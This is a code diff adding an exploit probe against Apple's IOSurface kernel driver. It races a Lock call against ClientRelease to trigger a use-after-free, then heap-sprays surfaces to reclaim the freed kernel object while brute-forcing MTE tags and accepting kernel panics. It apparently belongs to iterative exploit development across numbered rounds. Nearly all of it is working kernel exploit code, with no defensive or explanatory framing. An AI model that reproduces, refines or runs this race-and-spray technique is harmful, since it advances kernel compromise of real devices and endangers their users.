@@ -3176,6 +3176,182 @@ static void r292_probe(void) {
     fflush(stdout);
 }
 
+/* r293: Controlled exploit race — Lock vs ClientRelease with spray.
+ * r292 CONFIRMED: MTE is kernel-only. Userspace pointers untagged.
+ * mach_port_kobject returns addr=0x0 (kernel zeroes it). No KASLR leak.
+ *
+ * STRATEGY: Accept 1/16 MTE brute-force odds per attempt.
+ * Each iteration:
+ *   1. Create victim surface (64x64, same size as kernel IOSurface object)
+ *   2. Get 2 ClientLookups (refcount = Create+2*Lookup+CFRelease = 2)
+ *   3. Thread A: tight Lock/Unlock loop
+ *   4. Thread B: 2 ClientReleases (frees kernel object)
+ *   5. Thread C: spray 64 surfaces (reclaim freed slot)
+ *   6. If Lock's kernel access races correctly AND spray data has
+ *      matching MTE tag: controlled data at +0xD8 → no crash
+ *   7. If MTE tag mismatch: kernel panic → reboot → retry
+ *
+ * IMPORTANT: We use IOSurfaceLookup to get a FRESH ref after spray,
+ * and check if Lock succeeded without crash. If the app survives,
+ * the race was won.
+ *
+ * To minimize kernel panics, we do 1 attempt per launch.
+ * User relaunches after each reboot.
+ *
+ * MODIFICATION: Instead of tight Lock loop, use a SINGLE Lock call
+ * timed to race with the free. This reduces the race window to one
+ * attempt per trial, but we know exactly when the race fires.
+ */
+static volatile int r293_free_now = 0;
+static volatile int r293_spray_now = 0;
+static volatile int r293_lock_done = 0;
+static volatile kern_return_t r293_lock_result = -1;
+
+struct r293_ctx {
+    IOSurfaceRef surf;
+    uint32_t surfID;
+};
+
+static void *r293_freer(void *arg) {
+    struct r293_ctx *ctx = (struct r293_ctx *)arg;
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+
+    IOSurfaceClientRef cl1 = clLookup(ctx->surfID);
+    IOSurfaceClientRef cl2 = clLookup(ctx->surfID);
+
+    while (!r293_free_now) { /* spin */ }
+
+    CFRelease(ctx->surf);
+    clRelease(cl1);
+    clRelease(cl2);
+    r293_spray_now = 1;
+    return NULL;
+}
+
+static void *r293_locker(void *arg) {
+    struct r293_ctx *ctx = (struct r293_ctx *)arg;
+
+    while (!r293_free_now) { /* spin */ }
+    /* Delay slightly to let the free happen, then Lock races with it */
+    for (volatile int i = 0; i < 100; i++) {}
+
+    uint32_t seed = 0;
+    r293_lock_result = IOSurfaceLock(ctx->surf, 0, &seed);
+    r293_lock_done = 1;
+    return NULL;
+}
+
+static void r293_probe(void) {
+    rlog("\n=== r293: Controlled Exploit Race (1 attempt) ===\n");
+    rlog("  WARNING: This may cause kernel panic if MTE tag mismatches.\n");
+    rlog("  1/16 chance of success per attempt.\n\n");
+    fflush(stdout);
+
+    r293_free_now = 0;
+    r293_spray_now = 0;
+    r293_lock_done = 0;
+    r293_lock_result = -1;
+
+    /* Create victim */
+    CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+    CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+    CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+    CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+    CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+    CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+    CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+    CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+    CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+    struct r293_ctx ctx;
+    ctx.surf = IOSurfaceCreate(p);
+    CFRelease(p);
+    ctx.surfID = IOSurfaceGetID(ctx.surf);
+    rlog("  victim id=%u\n", ctx.surfID);
+    fflush(stdout);
+
+    /* Warm up: Lock/Unlock once to ensure kernel state is initialized */
+    IOSurfaceLock(ctx.surf, 0, NULL);
+    IOSurfaceUnlock(ctx.surf, 0, NULL);
+
+    /* Create threads */
+    pthread_t freer_t, locker_t;
+    pthread_create(&freer_t, NULL, r293_freer, &ctx);
+    pthread_create(&locker_t, NULL, r293_locker, &ctx);
+
+    rlog("  threads created, triggering race...\n");
+    fflush(stdout);
+
+    /* Trigger the race */
+    r293_free_now = 1;
+
+    /* Spray immediately */
+    while (!r293_spray_now && !r293_lock_done) usleep(1);
+
+    IOSurfaceRef sprays[64];
+    for (int i = 0; i < 64; i++) {
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+        CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+        sprays[i] = IOSurfaceCreate(sp);
+        CFRelease(sp);
+    }
+    rlog("  sprayed 64 surfaces\n");
+    fflush(stdout);
+
+    /* Wait for locker to finish */
+    pthread_join(locker_t, NULL);
+    pthread_join(freer_t, NULL);
+
+    rlog("  lock_result=0x%x lock_done=%d\n", r293_lock_result, r293_lock_done);
+
+    if (r293_lock_result == 0) {
+        rlog("  *** LOCK SUCCEEDED AFTER FREE+SPRAY! ***\n");
+        rlog("  The race was won. The kernel accessed sprayed data.\n");
+        rlog("  This means the MTE tag matched or was bypassed.\n");
+
+        /* Read what the lock gave us */
+        void *base = IOSurfaceGetBaseAddress(ctx.surf);
+        uint32_t seed = IOSurfaceGetSeed(ctx.surf);
+        rlog("  base=%p seed=%u\n", base, seed);
+    } else if (r293_lock_result == (kern_return_t)0xe00002c2) {
+        rlog("  Lock returned BadArgument — race missed (Lock ran after free).\n");
+        rlog("  The free completed before Lock entered kernel.\n");
+    } else {
+        rlog("  Lock returned unexpected: 0x%x\n", r293_lock_result);
+    }
+
+    /* Cleanup */
+    for (int i = 0; i < 64; i++) if (sprays[i]) CFRelease(sprays[i]);
+
+    rlog("\n*** r293 probe complete (survived = no kernel panic) ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -28424,6 +28600,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 293) {
+            rlog("*** rounds=293: Controlled Exploit Race (Lock vs Free+Spray) ***\n");
+            rlog("  r292: MTE kernel-only. No userspace tags. mach_port_kobject addr=0.\n");
+            rlog("  Accept 1/16 MTE brute-force. Single attempt per launch.\n\n");
+            fflush(stdout);
+            r293_probe();
             goto done;
         }
         if (rounds == 292) {
